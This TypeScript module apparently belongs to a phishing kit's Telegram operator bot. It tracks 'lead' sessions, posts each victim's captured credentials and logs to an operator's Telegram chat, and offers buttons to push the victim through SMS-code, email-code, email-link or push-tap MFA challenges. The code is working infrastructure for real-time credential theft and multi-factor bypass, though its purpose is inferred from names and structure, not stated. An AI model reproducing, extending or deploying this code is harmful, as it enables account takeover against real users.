import { Context, GrammyError, InlineKeyboard } from "grammy";
import { LeadSessionState, updateLeadSession } from "./lead.methods.js";
import { callbackActions, reviewCallbackData } from "./callback.methods.js";
import { InlineKeyboardMarkup } from "grammy/types";
import { composeTelegramMessage } from "./message.methods.js";
import { bot } from "../clients/grammy.client.js";

export function buildSessionOptions(
  sessionId: string,
  session: { overload: string[] },
) {
  let keyboard = new InlineKeyboard();
  if (!session.overload.includes("sms-code")) {
    keyboard = keyboard
      .text("SMS Code", reviewCallbackData(sessionId, callbackActions.smsCode))
      .row();
  }
  if (!session.overload.includes("email-code")) {
    keyboard = keyboard
      .text(
        "Email Code",
        reviewCallbackData(sessionId, callbackActions.emailCode),
      )
      .row();
  }
  if (!session.overload.includes("email-link")) {
    keyboard = keyboard
      .text(
        "Email Link",
        reviewCallbackData(sessionId, callbackActions.emailLink),
      )
      .row();
  }
  if (!session.overload.includes("prompt-yes")) {
    keyboard = keyboard
      .text(
        "Prompt Tap Yes",
        reviewCallbackData(sessionId, callbackActions.promptYes),
      )
      .row();
  }
  if (!session.overload.includes("prompt-num-p0")) {
    keyboard = keyboard
      .text(
        "Prompt Tap Number",
        reviewCallbackData(sessionId, callbackActions.promptNumPage(0)),
      )
      .row();
  }
  if (!session.overload.includes("prompt-num-p1")) {
    keyboard = keyboard
      .text(
        "Prompt Tap Number",
        reviewCallbackData(sessionId, callbackActions.promptNumPage(1)),
      )
      .row();
  }
  if (!session.overload.includes("prompt-num-p2")) {
    keyboard = keyboard
      .text(
        "Prompt Tap Number",
        reviewCallbackData(sessionId, callbackActions.promptNumPage(2)),
      )
      .row();
  }
  if (!session.overload.includes("prompt-num-p3")) {
    keyboard = keyboard
      .text(
        "Prompt Tap Number",
        reviewCallbackData(sessionId, callbackActions.promptNumPage(3)),
      )
      .row();
  }

  return keyboard
    .text("Restart", reviewCallbackData(sessionId, callbackActions.restart))
    .primary()
    .text("Complete", reviewCallbackData(sessionId, callbackActions.complete))
    .success();
}

const STALE_AUDIT_HINTS = [
  "message to audit not found",
  "message can't be audited",
  "message_id_invalid",
  "there is no text in the message to audit",
];

async function auditSessionMessage(
  run: () => Promise<unknown>,
  label: string,
): Promise<"edited" | "stale"> {
  try {
    await run();
    return "edited";
  } catch (error) {
    if (!(error instanceof GrammyError)) throw error;
    const description = error.description.toLowerCase();
    if (description.includes("message is not modified")) return "edited";
    if (STALE_AUDIT_HINTS.some((hint) => description.includes(hint))) {
      console.warn(`[telegram] ${label} is no longer editable; resending.`);
      return "stale";
    }
    console.error(
      `[telegram] ${label} failed (${error.error_code}): ${error.description}`,
    );
    throw error;
  }
}

export type SessionCard = {
  messageId: number;
  keyboard: InlineKeyboardMarkup | null;
};

export async function sendSessionToTelegram(
  session: LeadSessionState,
  options?: {
    resend?: true;
    context?: Context;
    inlineKeyboard?: InlineKeyboard;
    text?: string;
  },
): Promise<SessionCard> {
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!chatId) throw new Error("Telegram chat ID is not configured.");
  const message =
    (options?.text ? composeTelegramMessage(options.text) : "") ||
    composeTelegramMessage(
      session.notification,
      session.credentials,
      session.logs,
    );
  if (!message) throw new Error("Nothing to send: session has no content.");
  const replyMarkup = options?.inlineKeyboard ?? session.keyboard;
  const persistedKeyboard = replyMarkup
    ? { inline_keyboard: replyMarkup.inline_keyboard }
    : null;
  const ctx = options?.context;
  const ctxMessageId = ctx?.message?.message_id;
  const ctxMessageIsOurs =
    ctxMessageId !== undefined && ctx?.message?.from?.id === ctx?.me?.id;
  // 1. Update the card the button lives on.
  if (!options?.resend && ctxMessageIsOurs) {
    const outcome = await auditSessionMessage(
      () =>
        ctx!.editMessageText(message, {
          link_preview_options: { is_disabled: true },
          reply_markup: persistedKeyboard ?? undefined,
        }),
      "edit context message",
    );
    if (outcome === "edited") {
      return { messageId: ctxMessageId!, keyboard: persistedKeyboard };
    }
  }
  // 2. Update the card we already track.
  if (
    !options?.resend &&
    session.messageId &&
    session.messageId !== ctxMessageId
  ) {
    const outcome = await auditSessionMessage(
      () =>
        bot.api.editMessageText(chatId, session.messageId!, message, {
          link_preview_options: { is_disabled: true },
          reply_markup: persistedKeyboard ?? undefined,
        }),
      `edit session message ${session.messageId}`,
    );
    if (outcome === "edited") {
      return { messageId: session.messageId, keyboard: persistedKeyboard };
    }
  }
  // 3. Retire stale cards, then send a fresh one.
  const stale = new Set<number>();
  if (session.messageId) stale.add(session.messageId);
  if (options?.resend && ctxMessageId) stale.add(ctxMessageId);
  for (const id of stale) {
    try {
      if (id === ctxMessageId && ctx) await ctx.deleteMessage();
      else await bot.api.deleteMessage(chatId, id);
    } catch (error) {
      console.warn(
        `[telegram] could not delete stale message ${id}:`,
        error instanceof GrammyError ? error.description : error,
      );
    }
  }
  const result = await bot.api.sendMessage(chatId, message, {
    link_preview_options: { is_disabled: true },
    reply_markup: persistedKeyboard ?? undefined,
  });
  return { messageId: result.message_id, keyboard: persistedKeyboard };
}

export async function renderSessionCard(
  context: Context,
  sessionId: string,
  session: LeadSessionState,
  keyboard: InlineKeyboard,
  text?: string,
): Promise<void> {
  const sent = await sendSessionToTelegram(session, {
    context,
    inlineKeyboard: keyboard,
    text,
  });
  await updateLeadSession(sessionId, sent);
}
